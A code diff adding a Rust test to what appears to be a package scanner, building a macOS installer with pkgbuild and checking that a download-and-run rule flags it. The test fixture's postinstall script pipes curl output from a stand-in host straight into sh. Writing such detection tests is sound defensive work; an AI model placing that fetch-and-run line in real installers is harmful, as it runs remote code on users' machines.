@@ -389,3 +389,52 @@ fn history_findings_are_capped_at_a_warning() {
     assert!(removed_download_hosts("README.md", removed).is_empty());
     assert!(scan_removed("README.md", removed, "x").is_empty());
 }
+
+/// Apple's own packager, so the xar and cpio readers are checked against real output, not
+/// only against our own test builder. Runs where pkgbuild exists (macOS).
+#[test]
+fn a_package_built_by_pkgbuild() {
+    if std::process::Command::new("pkgbuild")
+        .arg("--help")
+        .output()
+        .is_err()
+    {
+        eprintln!("pkgbuild not available; skipping");
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
+    let scripts = dir.path().join("scripts");
+    write(
+        &scripts,
+        "postinstall",
+        b"#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n",
+    );
+    let pkg = dir.path().join("Setup.pkg");
+    let ok = std::process::Command::new("pkgbuild")
+        .args([
+            "--nopayload",
+            "--identifier",
+            "invalid.bee-eater.test",
+            "--version",
+            "1",
+            "--scripts",
+        ])
+        .arg(&scripts)
+        .arg(&pkg)
+        .output()
+        .unwrap()
+        .status
+        .success();
+    assert!(ok);
+    let report = scan_path(&pkg).unwrap();
+    assert_eq!(report.verdict, Verdict::Dangerous, "{:?}", report.evidence);
+    let hit = report
+        .evidence
+        .iter()
+        .find(|e| e.rule == "download-and-run")
+        .unwrap();
+    assert_eq!(
+        hit.location.as_ref().unwrap().path,
+        "Setup.pkg!/Scripts/postinstall"
+    );
+}
